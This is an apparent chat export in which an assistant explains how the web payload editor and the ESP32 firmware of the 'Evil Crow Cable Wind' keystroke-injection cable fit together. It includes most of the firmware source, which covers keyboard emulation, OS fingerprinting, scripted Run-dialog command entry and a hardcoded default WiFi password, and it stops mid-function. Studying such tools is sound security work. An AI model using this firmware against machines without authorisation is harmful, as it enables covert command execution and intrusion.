{
  "metadata": {
    "name": "Chat 2025-06-25 17:08",
    "description": "test1 desc",
    "created_at": "20250625_170808_175",
    "session_id": "0471c0c6"
  },
  "chat_history": [
    {
      "role": "user",
      "content": "what are parts of code in firmware.ino and livepayload.h which are connected"
    },
    {
      "role": "assistant",
      "content": "Here are the key connections between `firmware.ino` and `livepayload.h` in the Evil Crow Cable Wind project:\n\n### 1. **Payload Execution Flow**\n- `livepayload.h` contains the web interface for creating/editing payloads\n- When a payload is executed via the \"Run Payload\" button, it sends the content to `/runlivepayload` endpoint in `firmware.ino`\n- The firmware stores this in the `livepayload` global variable and sets `payload_state = 1`\n\n### 2. **Payload Processing**\n- In `firmware.ino`'s `loop()`, when `payload_state == 1`, it:\n  - Sets the keyboard layout using `setLayoutFromPayload()`\n  - Processes each line of `livepayload` using `payloadExec()`\n  - Executes corresponding keyboard actions via the `Keyboard` object\n\n### 3. **Command Mapping**\n- The command table in `livepayload.h` (HTML/Javascript) matches the command processing in `firmware.ino`'s `payloadExec()` function\n- Example commands:\n  - `RunWin cmd` -> Opens Windows Run dialog\n  - `PrintLine text` -> Types text + Enter\n  - `Delay ms` -> Pauses execution\n\n### 4. **Status Updates**\n- The web interface polls `/payloadstatuspayload` to check completion\n- `firmware.ino` sets `payloadExecuted = true` when done\n\n### 5. **OS Detection**\n- The \"DetectOS\" command in the payload triggers:\n  - `onDetectOSRequested()` in firmware\n  - Updates the web interface via the `/stats` endpoint\n\n### 6. **Key Constants**\n- The key names (KEY_LEFT_ALT, etc.) in the web interface match the `keyMap` in firmware\n\n### 7. **Layout Support**\n- The `# Layout: XX_XX` command in payloads corresponds to the `layoutMapInit` in firmware\n\n### 8. **Remote Shell**\n- Commands like `ShellWin IP` establish TCP connections handled by the firmware's `WiFiClient`\n\nThese connections allow the web interface to create payloads that the firmware can properly interpret and execute on the target machine. The separation keeps the complex UI logic in the web interface while the firmware focuses on low-level keyboard emulation."
    }
  ],
  "default_prompt": "{\"prompt\": \"\"}",
  "file_context": [
    {
      "name": "firmware.ino",
      "content": "#include <WiFiClient.h>\n#include <WiFi.h>\n#include <ESPmDNS.h>\n#include <WiFiServer.h>\n#include <WebServer.h>\n#include <LittleFS.h>\n#include <HTTPUpdateServer.h>\n#include \"USB.h\"\n#include \"USBHIDKeyboard.h\"\n#include \"index.h\"\n#include \"livepayload.h\"\n#include \"uploadpayload.h\"\n#include \"style.h\"\n#include \"javascript.h\"\n#include \"config.h\"\n#include \"readfile.h\"\n#include \"listpayloads.h\"\n#include \"autoexecplanning.h\"\n#include <ArduinoJson.h>\n#include <map>\n\n// Config default SSID, password and channel\nString ssid = \"Evil Crow Cable Wind\";  // Enter your SSID here\nString password = \"123456789\";         //Enter your Password here\nchar *serverIP;\nint serverPort = 4444;\n// WiFi monitoring variables\nunsigned long lastWifiCheckTime = 0;\nconst unsigned long wifiCheckInterval = 60000; // 1 minute\nbool wifiConnected = false;\n\n// Global variables\nString cmd;\nchar Command[255];\nString tmp_key;\nint payload_state = 0;\nString livepayload;\nbool payloadExecuted = false;\nconst bool formatOnFail = true;\nString FileName;\nString FileList;\nString vendorID, productID, manufacturerName, productName;\nString os;\nvolatile bool led_response_received = false;\nvolatile int led_event_count = 0;\nvolatile unsigned long led_event_time = 0;\nvolatile bool caps_status = false;\nvolatile bool num_status = false;\nvolatile bool scroll_status = false;\nvolatile bool numlock_checked = false;\nvolatile bool os_detection_complete = false;\nunsigned long caps_sent_time = 0;\nunsigned long num_sent_time = 0;\nunsigned long scroll_sent_time = 0;\nunsigned long caps_delay = 0;\nunsigned long num_delay = 0;\nunsigned long scroll_delay = 0;\nconst unsigned char *selected_layout = en_us;  // Default to EN_US\n\nFile fsUploadFile;\nWebServer controlserver(80);\nWiFiServer tcpServer(12345);\nWiFiClient clientServer;\nHTTPUpdateServer httpUpdater;\nUSBCDC USBSerial;\nUSBHIDKeyboard Keyboard;\n\nenum HostOS {\n  OS_UNKNOWN,\n  OS_WINDOWS,\n  OS_LINUX,\n  OS_MACOS,\n  OS_IOS,\n  OS_ANDROID\n};\n\nenum MetadataField {\n    META_NAME,\n    META_DESCRIPTION,\n    META_OS\n};\n\nHostOS detected_os = OS_UNKNOWN;\n\nextern const unsigned char en_us[128];\nextern const unsigned char es_es[128];\nextern const unsigned char fr_fr[128];\nextern const unsigned char it_it[128];\nextern const unsigned char da_dk[128];\nextern const unsigned char de_de[128];\nextern const unsigned char hr_hr[128];\nextern const unsigned char hu_hu[128];\nextern const unsigned char pt_pt[128];\nextern const unsigned char pt_br[128];\nextern const unsigned char be_be[128];\nextern const unsigned char br_br[128];\nextern const unsigned char ca_ca[128];\nextern const unsigned char ca_fr[128];\nextern const unsigned char sk_sk[128];\nextern const unsigned char cz_cz[128];\nextern const unsigned char sv_se[128];\nextern const unsigned char si_si[128];\n\nstd::map<String, const unsigned char *> layoutMapInit = {\n  { \"EN_US\", en_us },\n  { \"ES_ES\", es_es },\n  { \"FR_FR\", fr_fr },\n  { \"IT_IT\", it_it },\n  { \"DA_DK\", da_dk },\n  { \"DE_DE\", de_de },\n  { \"HR_HR\", hr_hr },\n  { \"HU_HU\", hu_hu },\n  { \"PT_PT\", pt_pt },\n  { \"PT_BR\", pt_br },\n  { \"BE_BE\", be_be },\n  { \"BR_BR\", br_br },\n  { \"CA_CA\", ca_ca },\n  { \"CA_FR\", ca_fr },\n  { \"SK_SK\", sk_sk },\n  { \"CZ_CZ\", cz_cz },\n  { \"SV_SE\", sv_se },\n  { \"SI_SI\", si_si },\n};\n\nstd::map<String, uint8_t> keyMap = {\n  { \"KEY_LEFT_ALT\", KEY_LEFT_ALT },\n  { \"KEY_LEFT_GUI\", KEY_LEFT_GUI },\n  { \"KEY_LEFT_CTRL\", KEY_LEFT_CTRL },\n  { \"KEY_LEFT_SHIFT\", KEY_LEFT_SHIFT },\n  { \"KEY_RIGHT_ALT\", KEY_RIGHT_ALT },\n  { \"KEY_RIGHT_GUI\", KEY_RIGHT_GUI },\n  { \"KEY_RIGHT_CTRL\", KEY_RIGHT_CTRL },\n  { \"KEY_RIGHT_SHIFT\", KEY_RIGHT_SHIFT },\n  { \"KEY_ENTER\", KEY_RETURN },\n  { \"KEY_UP_ARROW\", KEY_UP_ARROW },\n  { \"KEY_DOWN_ARROW\", KEY_DOWN_ARROW },\n  { \"KEY_LEFT_ARROW\", KEY_LEFT_ARROW },\n  { \"KEY_RIGHT_ARROW\", KEY_RIGHT_ARROW },\n  { \"KEY_BACKSPACE\", KEY_BACKSPACE },\n  { \"KEY_TAB\", KEY_TAB },\n  { \"KEY_PAUSE\", KEY_PAUSE },\n  { \"KEY_INSERT\", KEY_INSERT },\n  { \"KEY_DELETE\", KEY_DELETE },\n  { \"KEY_PAGE_UP\", KEY_PAGE_UP },\n  { \"KEY_PAGE_DOWN\", KEY_PAGE_DOWN },\n  { \"KEY_ESC\", KEY_ESC },\n  { \"KEY_SPACE\", KEY_SPACE },\n  { \"KEY_HOME\", KEY_HOME },\n  { \"KEY_END\", KEY_END },\n  { \"KEY_CAPS_LOCK\", KEY_CAPS_LOCK },\n  { \"KEY_PRINT_SCREEN\", KEY_PRINT_SCREEN },\n  { \"KEY_SCROLL_LOCK\", KEY_SCROLL_LOCK },\n  { \"KEY_NUM_LOCK\", KEY_NUM_LOCK },\n  { \"KEY_MENU\", KEY_MENU },\n  { \"LED_NUMLOCK\", LED_NUMLOCK },\n  { \"LED_CAPSLOCK\", LED_CAPSLOCK },\n  { \"LED_SCROLLLOCK\", LED_SCROLLLOCK },\n  { \"LED_COMPOSE\", LED_COMPOSE },\n  { \"LED_KANA\", LED_KANA },\n  { \"KEY_F1\", KEY_F1 },\n  { \"KEY_F2\", KEY_F2 },\n  { \"KEY_F3\", KEY_F3 },\n  { \"KEY_F4\", KEY_F4 },\n  { \"KEY_F5\", KEY_F5 },\n  { \"KEY_F6\", KEY_F6 },\n  { \"KEY_F7\", KEY_F7 },\n  { \"KEY_F8\", KEY_F8 },\n  { \"KEY_F9\", KEY_F9 },\n  { \"KEY_F10\", KEY_F10 },\n  { \"KEY_F11\", KEY_F11 },\n  { \"KEY_F12\", KEY_F12 }\n};\n\nvoid usbEventCallback(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {\n  if (event_base == ARDUINO_USB_HID_KEYBOARD_EVENTS) {\n    arduino_usb_hid_keyboard_event_data_t *data = (arduino_usb_hid_keyboard_event_data_t *)event_data;\n\n    if (event_id == ARDUINO_USB_HID_KEYBOARD_LED_EVENT) {\n      led_response_received = true;\n      led_event_count++;\n      led_event_time = millis();\n\n      caps_status = data->capslock != 0;\n      num_status = data->numlock != 0;\n      scroll_status = data->scrolllock != 0;\n      numlock_checked = true;\n\n      if (caps_sent_time > 0 && caps_delay == 0)\n        caps_delay = led_event_time - caps_sent_time;\n      if (num_sent_time > 0 && num_delay == 0)\n        num_delay = led_event_time - num_sent_time;\n      if (scroll_sent_time > 0 && scroll_delay == 0)\n        scroll_delay = led_event_time - scroll_sent_time;\n    }\n  }\n}\n\nvoid ensureNumLock() {\n  if (!numlock_checked) {\n    return;\n  }\n  if (!num_status) {\n    Keyboard.press(KEY_NUM_LOCK);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n}\n\nconst char *ascii_convert(char c) {\n  static char buffer[4];\n  if (c >= 32 && c <= 126) {\n    snprintf(buffer, sizeof(buffer), \"%d\", c);\n    return buffer;\n  }\n  return \"000\";\n}\n\nvoid writeLetterWindows(const char *asciiCode) {\n  Keyboard.press(KEY_LEFT_ALT);\n\n  for (int i = 0; asciiCode[i] != '\\0'; i++) {\n    switch (asciiCode[i]) {\n      case '0':\n        Keyboard.press(KEY_KP_0);\n        delay(2);\n        Keyboard.release(KEY_KP_0);\n        break;\n      case '1':\n        Keyboard.press(KEY_KP_1);\n        delay(2);\n        Keyboard.release(KEY_KP_1);\n        break;\n      case '2':\n        Keyboard.press(KEY_KP_2);\n        delay(2);\n        Keyboard.release(KEY_KP_2);\n        break;\n      case '3':\n        Keyboard.press(KEY_KP_3);\n        delay(2);\n        Keyboard.release(KEY_KP_3);\n        break;\n      case '4':\n        Keyboard.press(KEY_KP_4);\n        delay(2);\n        Keyboard.release(KEY_KP_4);\n        break;\n      case '5':\n        Keyboard.press(KEY_KP_5);\n        delay(2);\n        Keyboard.release(KEY_KP_5);\n        break;\n      case '6':\n        Keyboard.press(KEY_KP_6);\n        delay(2);\n        Keyboard.release(KEY_KP_6);\n        break;\n      case '7':\n        Keyboard.press(KEY_KP_7);\n        delay(2);\n        Keyboard.release(KEY_KP_7);\n        break;\n      case '8':\n        Keyboard.press(KEY_KP_8);\n        delay(2);\n        Keyboard.release(KEY_KP_8);\n        break;\n      case '9':\n        Keyboard.press(KEY_KP_9);\n        delay(2);\n        Keyboard.release(KEY_KP_9);\n        break;\n    }\n  }\n  Keyboard.release(KEY_LEFT_ALT);\n  delay(5);\n}\n\nvoid writeLineWindows(const char *str) {\n  ensureNumLock();\n\n  while (*str) {\n    const char *code = ascii_convert(*str);\n    writeLetterWindows(code);\n    str++;\n    delay(2);\n  }\n  Keyboard.press(KEY_NUM_LOCK);\n  delay(100);\n  Keyboard.releaseAll();\n}\n\nvoid toggleKey(uint8_t key, unsigned long *send_time) {\n  *send_time = millis();\n  led_response_received = false;\n\n  Keyboard.press(key);\n  delay(300);\n  Keyboard.release(key);\n  delay(800);\n}\n\nvoid resetKeyboardLEDs() {\n  unsigned long temp_time;\n  delay(500);\n  if (caps_status) {\n    toggleKey(KEY_CAPS_LOCK, &temp_time);\n    delay(800);\n  }\n  if (num_status) {\n    toggleKey(KEY_NUM_LOCK, &temp_time);\n    delay(800);\n  }\n  if (scroll_status) {\n    toggleKey(KEY_SCROLL_LOCK, &temp_time);\n    delay(800);\n  }\n}\n\nvoid detectHostOS() {\n  led_event_count = 0;\n  caps_status = num_status = scroll_status = 0;\n  caps_delay = num_delay = scroll_delay = 0;\n  caps_sent_time = num_sent_time = scroll_sent_time = 0;\n  led_response_received = false;\n  uint8_t initial_caps = caps_status;\n  toggleKey(KEY_CAPS_LOCK, &caps_sent_time);\n  delay(1500);\n\n  if (!led_response_received && caps_status != initial_caps) {\n    detected_os = OS_IOS;\n    return;\n  }\n\n  toggleKey(KEY_NUM_LOCK, &num_sent_time);\n  delay(1200);\n  toggleKey(KEY_SCROLL_LOCK, &scroll_sent_time);\n  delay(1200);\n\n  if (led_event_count == 0) {\n    detected_os = (caps_status != initial_caps) ? OS_IOS : OS_MACOS;\n  } else if (led_event_count >= 3 && caps_delay < 100 && num_delay < 100 && scroll_delay < 100) {\n    detected_os = OS_WINDOWS;\n  } else {\n    bool has_numlock_response = (num_delay > 0);\n    bool has_scrolllock_response = (scroll_delay > 0);\n\n    if (num_status && !scroll_status && has_numlock_response && !has_scrolllock_response) {\n      detected_os = OS_LINUX;\n    } else if ((caps_delay > 200 || num_delay > 200 || scroll_delay > 200) && (has_numlock_response || has_scrolllock_response)) {\n      detected_os = OS_ANDROID;\n    } else if (caps_status != initial_caps) {\n      detected_os = OS_IOS;\n    } else {\n      detected_os = OS_UNKNOWN;\n    }\n  }\n}\n\nvoid printDetectedOS() {\n  switch (detected_os) {\n    case OS_WINDOWS:\n      os = \"Windows\";\n      break;\n    case OS_LINUX:\n      os = \"Linux\";\n      break;\n    case OS_MACOS:\n      os = \"macOS\";\n      break;\n    case OS_IOS:\n      os = \"iOS\";\n      break;\n    case OS_ANDROID:\n      os = \"Android\";\n      break;\n    default:\n      os = \"OS Unknown\";\n      break;\n  }\n  os_detection_complete = true;\n}\n\nvoid onDetectOSRequested() {\n  resetKeyboardLEDs();\n  detectHostOS();\n  resetKeyboardLEDs();\n  printDetectedOS();\n}\n\nvoid deleteFile(fs::FS &fs, const String &path) {\n  // Delete the main payload file\n  bool payloadDeleted = fs.remove(path);\n\n  // Delete the corresponding meta file\n  String metaPath = path;\n  metaPath += \".meta\";\n  bool metaDeleted = fs.remove(metaPath);\n\n  if (payloadDeleted) {\n    controlserver.send(200, \"text/plain\", \"File deleted successfully\");\n  } else {\n    controlserver.send(500, \"text/plain\", \"Failed to delete file\");\n  }\n}\n\nvoid readFile(fs::FS &fs, const String &path) {\n  String payloadContent = \"\";\n  String payloadDescription = readPayloadMetadata(path, META_DESCRIPTION);\n\n  File file = fs.open(path);\n  if (!file || file.isDirectory()) {\n    FileList = \"Failed to open file\";\n    return;\n  }\n  while (file.available()) {\n    payloadContent += file.readString();\n  }\n  file.close();\n\n  if (path == \"\") {\n    FileList = \"File name is empty\";\n    return;\n  }\n\n  // Set layout based on payload content\n  setLayoutFromPayload(payloadContent);\n\n  livepayload = payloadContent;\n  \n  FileList = StaticFileList;\n  FileList.replace(\"{{path}}\", path);\n  FileList.replace(\"{{payloadContent}}\", payloadContent);\n  FileList.replace(\"{{payloadDescription}}\", payloadDescription);\n}\n\n\n// Helper function to save payload metadata\nvoid savePayloadMetadata(const String &filename, const String &name, const String &description, const String &os) {\n  String metaPath = filename + \".meta\";\n  File metaFile = LittleFS.open(metaPath, FILE_WRITE);\n  if (metaFile) {\n    // Write name (first line) - create a local copy to trim\n    String trimmedName = name;\n    trimmedName.trim();\n    metaFile.println(trimmedName);\n\n    // Write osType - to filter the listpayloads\n    String trimmedOS = os;\n    trimmedOS.trim();\n    metaFile.println(trimmedOS);\n\n    // Write description - trim and clean up line endings\n    String cleanDesc = description;\n    cleanDesc.trim(); // Trim both ends\n    cleanDesc.replace(\"\\r\\n\", \"\\n\"); // Normalize line endings\n    metaFile.print(cleanDesc); // Don't add extra newline at end\n\n    metaFile.close();\n  }\n}\n\n// Helper function to read payload metadata\nString readPayloadMetadata(const String &filename, MetadataField field) {\n    String metaPath = filename + \".meta\";\n\n    if (!LittleFS.exists(metaPath)) {\n        if (field == META_NAME) {\n            int lastSlash = filename.lastIndexOf('/');\n            return filename.substring(lastSlash + 1);\n        } else if (field == META_DESCRIPTION) {\n            return \"No description\";\n        } else {\n            return \"unknown\";\n        }\n    }\n\n    File metaFile = LittleFS.open(metaPath, FILE_READ);\n    if (!metaFile) {\n        if (field == META_NAME) {\n            int lastSlash = filename.lastIndexOf('/');\n            return filename.substring(lastSlash + 1);\n        } else if (field == META_DESCRIPTION) {\n            return \"No description\";\n        } else {\n            return \"unknown\";\n        }\n    }\n\n    String lines[3];  // name, os, description\n    for (int i = 0; i < 3 && metaFile.available(); i++) {\n        if (i == 2) { // Description field\n            String desc;\n            while (metaFile.available()) {\n                desc += metaFile.readString();\n            }\n            desc.trim(); // Ensure no leading/trailing whitespace\n            lines[i] = desc;\n        } else {\n            lines[i] = metaFile.readStringUntil('\\n');\n            lines[i].trim();\n        }\n    }\n\n    metaFile.close();\n\n    switch (field) {\n        case META_NAME:\n            return lines[0].length() > 0 ? lines[0] : filename.substring(filename.lastIndexOf('/') + 1);\n        case META_OS:\n            return lines[1].length() > 0 ? lines[1] : \"unknown\";\n        case META_DESCRIPTION:\n            return lines[2].length() > 0 ? lines[2] : \"No description\";\n        default:\n            return \"\";\n    }\n}\n\nvoid handleUpdatePayload() {\n    if (controlserver.hasArg(\"plain\")) {\n        DynamicJsonDocument doc(1024);\n        DeserializationError error = deserializeJson(doc, controlserver.arg(\"plain\"));\n\n        if (error) {\n            controlserver.send(400, \"application/json\", \n                \"{\\\"success\\\":false,\\\"message\\\":\\\"Invalid JSON\\\"}\");\n            return;\n        }\n\n        String path = doc[\"path\"] | \"\";\n        String content = doc[\"content\"] | \"\";\n\n        if (path.isEmpty() || content.isEmpty()) {\n            controlserver.send(400, \"application/json\", \n                \"{\\\"success\\\":false,\\\"message\\\":\\\"Missing path or content\\\"}\");\n            return;\n        }\n\n        File file = LittleFS.open(path, \"w\");\n        if (!file) {\n            controlserver.send(500, \"application/json\", \n                \"{\\\"success\\\":false,\\\"message\\\":\\\"Failed to open file\\\"}\");\n            return;\n        }\n\n        file.print(content);\n        file.close();\n        controlserver.send(200, \"application/json\", \n            \"{\\\"success\\\":true,\\\"message\\\":\\\"Payload updated\\\"}\");\n    } else {\n        controlserver.send(400, \"application/json\", \n            \"{\\\"success\\\":false,\\\"message\\\":\\\"No data received\\\"}\");\n    }\n}\n\n// Updated handleFileUpload\nvoid handleFileUpload() {\n  HTTPUpload &upload = controlserver.upload();\n  static const uint32_t MAX_FILE_SIZE = 204800;  // 200KB limit\n  static uint32_t totalUploaded = 0;\n  static String payloadName, payloadDescription, fileName, payloadOS;\n\n  if (upload.status == UPLOAD_FILE_START) {\n    totalUploaded = 0;\n    payloadName = controlserver.arg(\"payloadName\");\n    payloadDescription = controlserver.arg(\"payloadDescription\");\n    payloadOS = controlserver.arg(\"payloadOS\");\n\n    fileName = upload.filename;\n\n    if (!fileName.endsWith(\".txt\")) {\n      controlserver.send(400, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Only .txt files allowed\\\"}\");\n      return;\n    }\n\n    if (!fileName.startsWith(\"/\")) {\n      fileName = String(\"/payloads/\") + fileName;\n    }\n\n    if (!LittleFS.exists(\"/payloads\")) {\n      LittleFS.mkdir(\"/payloads\");\n    }\n\n    fsUploadFile = LittleFS.open(fileName, \"w\");\n    if (!fsUploadFile) {\n      controlserver.send(500, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Cannot create file\\\"}\");\n      return;\n    }\n  } else if (upload.status == UPLOAD_FILE_WRITE) {\n    totalUploaded += upload.currentSize;\n    if (totalUploaded > MAX_FILE_SIZE) {\n      fsUploadFile.close();\n      LittleFS.remove(fsUploadFile.name());\n      // Remove meta file using proper string concatenation\n      String metaPath = fsUploadFile.name();\n      metaPath += \".meta\";\n      LittleFS.remove(metaPath);\n      controlserver.send(413, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"File exceeded size limit\\\"}\");\n      return;\n    }\n\n    if (fsUploadFile) {\n      fsUploadFile.write(upload.buf, upload.currentSize);\n    }\n  } else if (upload.status == UPLOAD_FILE_END) {\n    if (fsUploadFile) {\n      fsUploadFile.close();\n      savePayloadMetadata(fileName, payloadName, payloadDescription, payloadOS);\n    }\n  } else {\n    if (fsUploadFile) {\n      fsUploadFile.close();\n      LittleFS.remove(fsUploadFile.name());\n      // Remove meta file using proper string concatenation\n      String metaPath = fsUploadFile.name();\n      metaPath += \".meta\";\n      LittleFS.remove(metaPath);\n    }\n    controlserver.send(500, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Upload failed\\\"}\");\n  }\n}\n\nvoid listDir(fs::FS &fs, const char *dirname, uint8_t levels) {\n  FileList = StaticListPayloads;\n\n  File root = fs.open(dirname);\n  if (!root || !root.isDirectory()) {\n    FileList += \"<br>Empty<br></body></html>\";\n    return;\n  }\n\n  File file = root.openNextFile();\n  while (file) {\n    String fileName = \"/payloads/\";\n    fileName += file.name();\n\n    // Skip metadata files\n    if (fileName.endsWith(\".meta\")) {\n      file = root.openNextFile();\n      continue;\n    }\n\n    String payloadName = readPayloadMetadata(fileName, META_NAME);\n    String osType = readPayloadMetadata(fileName, META_OS);\n    String payloadDesc = readPayloadMetadata(fileName, META_DESCRIPTION);\n    \n    // Truncate description to first two lines or 120 characters\n    int newlinePos = payloadDesc.indexOf('\\n');\n    if (newlinePos != -1) {\n      int secondNewline = payloadDesc.indexOf('\\n', newlinePos + 1);\n      if (secondNewline != -1) {\n        payloadDesc = payloadDesc.substring(0, secondNewline) + \"...\";\n      }\n    } else if (payloadDesc.length() > 120) {\n      payloadDesc = payloadDesc.substring(0, 120) + \"...\";\n    }\n\n    FileList += \"<div class='payload-item' data-os='\" + osType + \"'>\";\n    FileList += \"<a class=\\\"pyaloadButton\\\" href=\\\"/showpayload?payload=\" + fileName + \"\\\">\" + payloadName + \"</a>\";\n    FileList += \"<div class='payload-desc'>\" + payloadDesc + \"</div>\";\n    FileList += \"<div class='payload-filename'>\" + String(file.name()) + \" - OS Type: \"+ osType +\"</div>\";\n    FileList += \"</div>\";\n\n    file = root.openNextFile();\n  }\n  FileList += \"</body></html>\";\n}\n\nvoid handleStats() {\n  String json = \"{\";\n  json += \"\\\"uptime\\\":\" + String(millis() / 1000);\n  json += \",\\\"cpu0\\\":\" + String(getCpuFrequencyMhz());\n  json += \",\\\"cpu1\\\":\" + String(getXtalFrequencyMhz());\n  json += \",\\\"temperature\\\":\" + String(temperatureRead());\n  json += \",\\\"freespiffs\\\":\" + String(LittleFS.totalBytes() - LittleFS.usedBytes());\n  json += \",\\\"totalram\\\":\" + String(ESP.getHeapSize());\n  json += \",\\\"freeram\\\":\" + String(ESP.getFreeHeap());\n  json += \",\\\"os\\\":\\\"\" + os + \"\\\"\";\n  json += \",\\\"ssid\\\":\\\"\" + WiFi.SSID() + \"\\\"\";\n  json += \",\\\"ipaddress\\\":\\\"\" + WiFi.localIP().toString() + \"\\\"\";\n  json += \"}\";\n  controlserver.send(200, \"application/json\", json);\n}\n\nvoid connectToWiFi() {\n  // Disconnect first if currently connected\n  if (WiFi.status() == WL_CONNECTED) {\n    WiFi.disconnect();\n    delay(1000);\n  }\n\n  bool hasPrimaryConfig = LittleFS.exists(\"/wifi_config.txt\");\n  bool hasBackupConfig = LittleFS.exists(\"/wifi_backup_config.txt\");\n\n  // Try primary WiFi if it exists\n  if (hasPrimaryConfig) {\n    File configFile = LittleFS.open(\"/wifi_config.txt\", FILE_READ);\n    if (configFile) {\n      String primarySSID = configFile.readStringUntil('\\n');\n      primarySSID.trim();\n      String primaryPassword = configFile.readStringUntil('\\n');\n      primaryPassword.trim();\n      configFile.close();\n\n      WiFi.begin(primarySSID.c_str(), primaryPassword.c_str());\n\n      unsigned long startAttemptTime = millis();\n      while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {\n        delay(500);\n      }\n\n      if (WiFi.status() == WL_CONNECTED) {\n        initMDNS();\n        return;\n      }\n    }\n  }\n\n  // Try backup WiFi if it exists and primary failed\n  if (hasBackupConfig) {\n    File backupFile = LittleFS.open(\"/wifi_backup_config.txt\", FILE_READ);\n    if (backupFile) {\n      String backupSSID = backupFile.readStringUntil('\\n');\n      backupSSID.trim();\n      String backupPassword = backupFile.readStringUntil('\\n');\n      backupPassword.trim();\n      backupFile.close();\n\n      WiFi.begin(backupSSID.c_str(), backupPassword.c_str());\n\n      unsigned long startAttemptTime = millis();\n      while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {\n        delay(500);\n      }\n\n      if (WiFi.status() == WL_CONNECTED) {\n        initMDNS();\n        return;\n      }\n    }\n  }\n\n  // Fall back to default credentials if no saved configs worked\n  WiFi.begin(ssid.c_str(), password.c_str());\n\n  unsigned long startAttemptTime = millis();\n  while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {\n    delay(500);\n  }\n\n  if (WiFi.status() == WL_CONNECTED) {\n    initMDNS();\n  }\n}\n\nvoid initMDNS() {\n  String hostname = \"cable-wind\";\n  if (LittleFS.exists(\"/hostname_config.txt\")) {\n    File hostnameFile = LittleFS.open(\"/hostname_config.txt\", FILE_READ);\n    if (hostnameFile) {\n      hostname = hostnameFile.readStringUntil('\\n');\n      hostname.trim();\n      hostnameFile.close();\n    }\n  }\n\n  MDNS.end();\n  if (!MDNS.begin(hostname.c_str())) {\n    Serial.println(\"Error setting up MDNS responder!\");\n  }\n\n  tcpServer.begin();\n  wifiConnected = true;\n}\n\nvoid handleUpdateHostname() {\n  if (controlserver.hasArg(\"hostname\")) {\n    String newHostname = controlserver.arg(\"hostname\");\n\n    File fsUploadFile = LittleFS.open(\"/hostname_config.txt\", FILE_WRITE);\n    if (!fsUploadFile) {\n      controlserver.send(500, \"application/json\", \"{\\\"success\\\":false,\\\"message\\\":\\\"Failed to save hostname\\\"}\");\n      return;\n    }\n\n    fsUploadFile.println(newHostname);\n    fsUploadFile.close();\n    controlserver.send(200, \"application/json\", \"{\\\"success\\\":true,\\\"message\\\":\\\"Hostname updated successfully! Device will restart.\\\"}\");\n    delay(1000);\n    ESP.restart();\n  } else {\n    controlserver.send(400, \"application/json\", \"{\\\"success\\\":false,\\\"message\\\":\\\"No hostname provided\\\"}\");\n  }\n}\n\nvoid handleGetHostname() {\n  String currentHostname = \"cable-wind\";  // default\n\n  if (LittleFS.exists(\"/hostname_config.txt\")) {\n    File fsUploadFile = LittleFS.open(\"/hostname_config.txt\", FILE_READ);\n    if (fsUploadFile) {\n      currentHostname = fsUploadFile.readStringUntil('\\n');\n      currentHostname.trim();\n      fsUploadFile.close();\n    }\n  }\n\n  controlserver.send(200, \"text/plain\", currentHostname);\n}\n\n// Function to parse and set layout from payload content\nvoid setLayoutFromPayload(const String &payloadContent) {\n  int layoutPos = payloadContent.indexOf(\"# Layout: \");\n\n  if (layoutPos != -1) {\n    int start = layoutPos + 10;\n    int end = payloadContent.indexOf('\\n', start);\n    if (end == -1) {\n      end = payloadContent.length();\n    }\n    String tmp_layout = payloadContent.substring(start, end);\n    tmp_layout.trim();\n\n    if (layoutMapInit.find(tmp_layout) != layoutMapInit.end()) {\n      selected_layout = layoutMapInit[tmp_layout];\n      Keyboard.setLayout(selected_layout);\n      return;  // Exit after setting layout from payload\n    }\n  }\n\n  // Fallback to saved layout if no layout specified in payload\n  if (LittleFS.exists(\"/layout_config.txt\")) {\n    File fsUploadFile = LittleFS.open(\"/layout_config.txt\", FILE_READ);\n    if (fsUploadFile) {\n      String layoutKey = fsUploadFile.readStringUntil('\\n');\n      layoutKey.trim();\n      fsUploadFile.close();\n\n      auto it = layoutMapInit.find(layoutKey);\n      if (it != layoutMapInit.end()) {\n        selected_layout = it->second;\n        Keyboard.setLayout(selected_layout);\n      }\n    }\n  }\n}\n\n// Function to get the currently selected layout\nString getCurrentLayout() {\n  String currentLayout = \"en_us\";  // Default to EN_US\n\n  if (LittleFS.exists(\"/layout_config.txt\")) {\n    File fsUploadFile = LittleFS.open(\"/layout_config.txt\", FILE_READ);\n    if (fsUploadFile) {\n      currentLayout = fsUploadFile.readStringUntil('\\n');\n      currentLayout.trim();\n      fsUploadFile.close();\n    }\n  }\n\n  return currentLayout;\n}\n\n// Function to save the layout configuration to a file\nvoid saveLayoutConfig(const String &layout) {\n  File fsUploadFile = LittleFS.open(\"/layout_config.txt\", FILE_WRITE);\n  if (!fsUploadFile) {\n    controlserver.send(500, \"text/plain\", \"Failed to open file for writing\");\n    return;\n  }\n\n  fsUploadFile.println(layout);\n  fsUploadFile.close();\n}\n\nvoid payloadExec() {\n  if (cmd.startsWith(\"RunMac \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.press(KEY_SPACE);\n    delay(100);\n    Keyboard.releaseAll();\n    delay(2000);\n    Keyboard.println(Command + 7);\n  }\n\n  else if (cmd.startsWith(\"RunLauncher \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    Keyboard.press(KEY_LEFT_ALT);\n    Keyboard.press(KEY_F2);\n    delay(100);\n    Keyboard.releaseAll();\n    delay(2000);\n    Keyboard.println(Command + 12);\n  }\n\n  else if (cmd.startsWith(\"RunNix \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    Keyboard.press(KEY_LEFT_CTRL);\n    Keyboard.press(KEY_LEFT_ALT);\n    Keyboard.print(\"t\");\n    delay(100);\n    Keyboard.releaseAll();\n    delay(2000);\n    Keyboard.println(Command + 7);\n  }\n\n  else if (cmd.startsWith(\"RunWin \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print('r');\n    delay(100);\n    Keyboard.releaseAll();\n    delay(2000);\n    Keyboard.println(Command + 7);\n  }\n\n  else if 